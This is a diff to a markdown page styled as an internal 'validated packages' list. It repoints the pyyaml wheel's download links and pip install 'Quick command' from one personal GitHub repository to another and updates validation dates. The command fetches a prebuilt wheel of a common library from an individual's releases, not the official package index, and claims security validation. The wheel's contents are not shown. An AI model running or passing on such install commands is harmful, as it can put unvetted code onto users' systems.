@@ -463,13 +463,14 @@ pip install https://github.com/bdousa/PythonFeed-Update/releases/download/python
 
 #### `pyyaml`
 - **Latest version:** `6.0.3`
-- **Validated:** 2025-10-10
+- **Validated:** 2026-06-11
 - **Package type:** Python 3.13 64-bit wheel
-- **Download wheel:** [download](https://github.com/bdousa/pythonFeedWindows/releases/download/pyyaml-v6.0.3/pyyaml-6.0.3-cp313-cp313-win_amd64.whl)
-- **Release notes:** [release](https://github.com/bdousa/pythonFeedWindows/releases/tag/pyyaml-v6.0.3)
+- **Download wheel:** [download](https://github.com/bdousa/PythonFeed-Update/releases/download/pyyaml-v6.0.3/pyyaml-6.0.3-cp313-cp313-win_amd64.whl)
+- **Release notes:** [release](https://github.com/bdousa/PythonFeed-Update/releases/tag/pyyaml-v6.0.3)
+- **Validation run:** [build #27298822478](https://github.com/bdousa/PythonFeed-Update/actions/runs/27298822478)
 - **Quick command:**
 ```text
-pip install https://github.com/bdousa/pythonFeedWindows/releases/download/pyyaml-v6.0.3/pyyaml-6.0.3-cp313-cp313-win_amd64.whl
+pip install https://github.com/bdousa/PythonFeed-Update/releases/download/pyyaml-v6.0.3/pyyaml-6.0.3-cp313-cp313-win_amd64.whl
 ```
 
 #### `pyzipper`
@@ -678,6 +679,6 @@ To request validation of a new package:
 2. **Select Category**: Choose '3rd party library approval'
 3. **Approval Process**: Packages typically validated within 3 business days
 
-*Last updated: 2026-06-11 15:47 UTC*
+*Last updated: 2026-06-11 16:02 UTC*
 
 *Powered by Azure DevOps Security Pipeline*
